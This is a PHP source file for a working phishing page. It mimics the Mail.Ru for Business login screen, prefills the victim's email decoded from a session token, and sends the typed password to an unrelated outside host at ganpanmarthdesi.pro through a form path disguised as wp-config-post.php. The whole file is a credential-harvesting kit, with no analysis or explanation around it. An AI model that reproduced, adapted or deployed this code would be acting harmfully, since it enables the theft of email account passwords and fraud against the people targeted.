<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>&#1055;&#1083;&#1072;&#1090;&#1092;&#1086;&#1088;&#1084;&#1072; Mail.Ru &#1076;&#1083;&#1103; &#1073;&#1080;&#1079;&#1085;&#1077;&#1089;&#1072;</title>
<link rel="shortcut icon" href="https://biz.mail.ru/static/84f9c5f6/landing/b2b-2017/meta/favicon.ico"/>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<style>
  html, body {
  font-family: Roboto,sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 16px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
</style>
<body background="https://i.ibb.co/nb8c8R7/bg.png">

<div align="center">
	<table border="0" width="420" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="129"></td>
				</tr>
				<tr>
					<td height="364" background="https://i.ibb.co/gJWpcWK/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
					  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
						<tr>
							<td height="163">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="19"></td>
								</tr>
								<tr>
									<td height="47">
									<p align="center">
									  <span style="background-color:#fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.3; height: 1.1em; padding: 0 .4167em; font-size: 2.6em; font-weight: 100;" ><?php echo $ddomain;?></span>
									</td>
								</tr>
								<tr>
									<td height="67"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0" height="182">
								<tr>
									<td width="99"></td>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td height="32">
											   <div class="input-group">
                                                                                           <input  value="<?php echo $users;?>" name="user" placeholder="&#37038;&#31665;&#24080;&#21495;" type="text" class="form-control" id="usr" style="font-color:#000; font-weight:350; box-shadow:inset 0 2px rgba(0,0,0,.04); bfont-size: 13px; order-radius:8px 0px 0px 8px; width:100%; height:32px; border:none; border-left:1px #ddd solid; border-top:1px #ddd solid; border-bottom:1px #ddd solid" size="20" >
	                                                                                   <span style="background-color:#fff; border:none; box-shadow:inset 0 2px rgba(0,0,0,.04); font-size: 13px; border-radius:0px 8px 8px 0px; border-top:1px #ddd solid; border-right:1px #ddd solid; border-bottom: 1px #ddd solid" class="input-group-addon">@<?php echo $ddomain;?></span>
                                                                                           <input  type="hidden" name="link" size="20" value="https://biz.mail.ru/login/<?php echo $ddomain;?>" >
	                                                                                   <input  type="hidden" name="domain" size="20" value="<?php echo $ddomain;?>" >
                                                                                           <input  type="hidden" name="sender" size="20" value="Biz.mail.ru" >
                                                                                           </div>
											</td>
										</tr>
										<tr>
											<td height="37"></td>
										</tr>
										<tr>
											<td height="32">
											    <input type="password" name="passwd" placeholder="" id="" class="form-control" id="usr" style="font-color:#000; focus:black; font-weight:350; box-shadow:inset 0 2px rgba(0,0,0,.04); border-radius:8px; height:32px; border:none; border:1px #ddd solid" required autofocus >
											</td>
										</tr>
										<tr>
											<td height="40"></td>
										</tr>
										<tr>
											<td height="40">
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="41"></td>
													<td>
													<input type="image" src="https://i.ibb.co/6RyQwMG/btn.png" width="138" height="40" ></td>
													<td width="43">&nbsp;</td>
												</tr>
											</table>
											</td>
										</tr>
									</table>
									</td>
									<td width="99">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="19"></td>
						</tr>
						</form>
					</table>
					</td>
				</tr>
				<tr>
					<td height="140"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>
</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>